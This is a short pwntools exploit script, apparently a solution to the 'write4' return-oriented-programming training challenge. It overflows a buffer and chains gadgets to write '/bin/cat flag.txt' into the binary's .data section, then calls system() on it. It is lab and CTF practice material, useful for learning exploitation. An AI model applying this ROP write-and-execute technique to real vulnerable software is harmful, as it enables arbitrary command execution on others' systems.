from pwn import *

context(terminal = ["tmux", "new-window"])

#p = gdb.debug("./write4", gdbscript = '''
#init-pwndbg
#b *0x4007ff
#''')
p = process("./write4")

# https://aboureada.com/cheat_sheet/2017/12/20/radare2_cheat_sheet.html

elf = ELF("./write4")
rop = ROP(elf)

junk = "A"*40
mov_r14_r15 = p64(0x400820) #  mov qword ptr [r14], r15 ; ret
data = p64(0x00601050)
pop_r14_r15 = p64(0x400890) # pop r14 ; pop r15 ; ret
sys = p64(0x4005e0)
pop_rdi = p64(0x400893) # pop rdi ; ret
cat = "/bin/cat flag.txt"
got_plt = p64(0x601000)

# 25 0x00001050    16 0x00601050    16 -rw- .data
# we do a pxw 20 @ 0x00601050, and we see that the memory it's free

def place_string(mov, pop, dest_addr, string):
  while (len(string)%8 != 0):
    string += "\x00"
  splitted_string = [string[i:i+8] for i in range(0,len(string),8)]
  first_payload = ""
  for i in range(len(splitted_string)):
    first_payload += pop
    first_payload += p64(u64(dest_addr) + (i*8))
    first_payload += splitted_string[i]
    first_payload += mov
  return  first_payload

payload = junk + place_string(mov_r14_r15, pop_r14_r15, data, cat) + pop_rdi + data + sys

p.recvuntil("> ")
p.sendline(payload)
print(p.recv())
p.interactive()
